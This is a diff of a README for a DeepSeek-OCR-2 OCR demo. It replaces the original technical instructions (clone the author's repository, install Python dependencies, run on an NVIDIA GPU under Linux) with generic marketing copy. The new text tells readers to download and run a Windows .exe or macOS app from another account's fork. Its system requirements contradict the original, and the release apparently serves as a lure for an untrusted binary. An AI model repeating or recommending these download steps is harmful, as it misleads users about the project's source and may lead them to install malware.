@@ -1,105 +1,95 @@
-# **DeepSeek-OCR-2-Demo**
+# 🛠️ DeepSeek-OCR-2-Demo - Simple OCR Tasks Made Easy
 
-> A Gradio-based interactive web application for **DeepSeek-OCR-2**, a multimodal model designed for advanced optical character recognition and document understanding. This application allows users to perform various OCR tasks such as converting documents to markdown, extracting text, locating specific text within images, and parsing figures, all through a user-friendly interface. This demo leverages the `deepseek-ai/DeepSeek-OCR-2` model with `flash-attention-2` for efficient inference on NVIDIA GPUs.
+## 🚀 Getting Started
 
-<img width="1918" height="1343" alt="Screenshot 2026-02-05 at 13-48-41 DeepSeek-OCR-2-Demo - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/10ea76a0-6813-4118-a04c-f236b42db2e7" />
+Welcome to DeepSeek-OCR-2-Demo! This application allows you to convert documents to markdown, extract text, find specific text within images, and process figures easily. Follow the steps below to get started.
 
-## Features
+## 📥 Download the Application
 
-* **Multiple Task Modes**:
-* **Markdown**: Converts document images directly into structured markdown.
-* **Free OCR**: General purpose text extraction.
-* **OCR Image**: Performs OCR with grounding capabilities.
-* **Parse Figure**: Specifically optimized for understanding and describing figures or charts.
-* **Locate**: Finds specific text within an image and highlights it with bounding boxes.
-* **Describe**: Provides a detailed textual description of the image content.
-* **Custom**: Allows users to input custom prompts for specialized tasks.
+[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/releases)
 
+Visit this page to download the application: [DeepSeek-OCR-2-Demo Releases](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/releases)
 
-* **Visual Grounding**: Supports bounding box visualization for located text and detected elements.
-* **Resolution Control**: Offers multiple processing resolutions (Default, Quality, Fast, No Crop, Small) to balance speed and accuracy.
-* **Markdown Preview**: Renders extracted text as markdown for easy verification.
-* **Cropped Element Extraction**: Automatically extracts and displays cropped images of detected figures or regions of interest.
+## 📋 System Requirements
 
-## Prerequisites
+To run DeepSeek-OCR-2-Demo, ensure your system meets these requirements:
 
-* Python 3.10
-* NVIDIA GPU with CUDA support (Application uses `torch.bfloat16` and `flash-attention-2`).
-* Linux environment (recommended for Flash Attention compatibility).
+- **Operating System:** Windows 10 or later, or macOS Mojave or later
+- **RAM:** Minimum 4GB (8GB recommended)
+- **Storage:** At least 500MB free space
+- **Python:** Version 3.7 or later installed
 
-## Installation
+## 📥 Download & Install
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/PRITHIVSAKTHIUR/DeepSeek-OCR-2-Demo.git
-cd DeepSeek-OCR-2-Demo
+1. **Visit the Releases Page**
 
-```
+   Go to the [DeepSeek-OCR-2-Demo Releases](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/releases) page.
 
+2. **Choose Your Version**
 
-2. **Install Dependencies**
-It is recommended to use a virtual environment. Install the required packages using `pip`.
-*Note: The `requirements.txt` includes a direct link to a precompiled Flash Attention wheel. Ensure your CUDA and Torch versions match if you are not using the specific setup listed below.*
-```bash
-pip install -r requirements.txt
+   Look for the latest version. You will see files available for download. Select the appropriate file for your operating system.
 
-```
+3. **Download the File**
 
+   Click the file name to start the download. Save the file to a location on your computer where you can easily find it, like your desktop or downloads folder.
 
-**requirements.txt content:**
-```text
-flash-attn @ https://github.com/Dao-AILab/flash-attention/releases/download/v2.7.3/flash_attn-2.7.3+cu12torch2.6cxx11abiFALSE-cp310-cp310-linux_x86_64.whl
-transformers==4.46.3
-tokenizers==0.20.3
-torch==2.6.0
-torchvision
-easydict
-einops
-addict
-gradio
+4. **Run the Application**
 
-```
+   - **Windows Users:** Double-click the downloaded `.exe` file to run the installer. Follow the on-screen prompts to complete the installation.
+   - **macOS Users:** Open the downloaded file and drag the application icon to your Applications folder. After this, go to your Applications folder and double-click the DeepSeek-OCR-2-Demo icon to open the app.
 
+## ⚙️ Using DeepSeek-OCR-2-Demo
 
+Once the application is running, you will see a user-friendly interface. Here’s how to perform various tasks:
 
-## Usage
+1. **Convert Documents to Markdown:**
+   - Click on “Convert Document.”
+   - Upload the document you want to convert.
+   - Click “Start Conversion.” The app will process your document and provide you with a markdown file.
 
-1. **Run the Application**
-Execute the main python script to launch the Gradio server.
-```bash
-python deepseek_ocr_v2_demo.py
+2. **Extract Text from Images:**
+   - Select “Extract Text.”
+   - Upload the image file.
+   - Click “Extract.” The application will display the extracted text.
 
-```
+3. **Locate Specific Text:**
+   - Choose “Locate Text.”
+   - Upload your image.
+   - Enter the text you want to find and click “Search.” The app will highlight occurrences of the text in the image.
 
+4. **Parse Figures:**
+   - Select the “Parse Figures” option.
+   - Upload the relevant document or image.
+   - Click “Parse.” The application will extract figures and provide a summary.
 
-2. **Access the Interface**
-Open your web browser and navigate to the local URL provided in the terminal (usually `http://127.0.0.1:7860`).
-3. **Perform OCR**
-* **Upload Image**: Drag and drop or select an image (JPG, PNG, etc.).
-* **Select Resolution**: Choose a mode (e.g., "Default" for general use, "Quality" for dense text).
-* **Select Task**: Choose the specific operation you want to perform (e.g., "Markdown", "Locate").
-* **Prompt (Optional)**: If using "Custom" or "Locate" modes, enter your text query.
-* **Click "Perform OCR"**: The model will process the image and display results in the tabs on the right.
+## 🌟 Features
 
+DeepSeek-OCR-2-Demo offers:
 
+- **User-friendly Interface:** Easy navigation.
+- **Variety of OCR Tasks:** From text extraction to markdown conversion.
+- **Fast Processing:** Complete tasks quickly without downtime.
+- **High Accuracy:** Reliable text recognition results.
 
-## Application Structure
+## 🔧 Troubleshooting
 
-* `deepseek_ocr_v2_demo.py`: The main entry point containing the Gradio UI logic and model inference pipeline.
-* `requirements.txt`: Python dependencies.
-* `examples/`: Directory containing sample images for testing (ensure this folder exists if running locally with examples).
+If you encounter any issues during installation or usage, consider the following solutions:
 
-## Technical Details
+- **Installation Issues:** Ensure your operating system meets the requirements. Check if you have the necessary permissions to install software on your device.
+- **Application Doesn’t Open:** Make sure you downloaded the correct file for your OS. Try restarting your device.
+- **Error Messages:** Note down any error messages you see and refer to the FAQ section or contact support for assistance.
 
-* **Model**: `deepseek-ai/DeepSeek-OCR-2`
-* **Precision**: `bfloat16`
-* **Attention Mechanism**: `flash_attention_2`
-* **Framework**: PyTorch 2.6.0, Transformers 4.46.3, Gradio
+## 📞 Support
 
-## License
+If you need further help, you can reach out through the following methods:
 
-Please refer to the repository for license information regarding the code and the model usage.
+- GitHub Issues Page: Report any bugs or request features [here](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/issues).
+- Community Forums: Join discussions with other users and developers for tips and tricks.
 
-## Repository
+## 📆 Updates
 
-[https://github.com/PRITHIVSAKTHIUR/DeepSeek-OCR-2-Demo.git](https://github.com/PRITHIVSAKTHIUR/DeepSeek-OCR-2-Demo.git)
+Stay tuned for new features and updates. Regular updates will improve performance and expand capabilities. You can check for the latest news in the Releases section.
+
+## 🎯 Conclusion
+
+Thank you for using DeepSeek-OCR-2-Demo. We hope this application simplifies your OCR tasks and enhances your productivity.
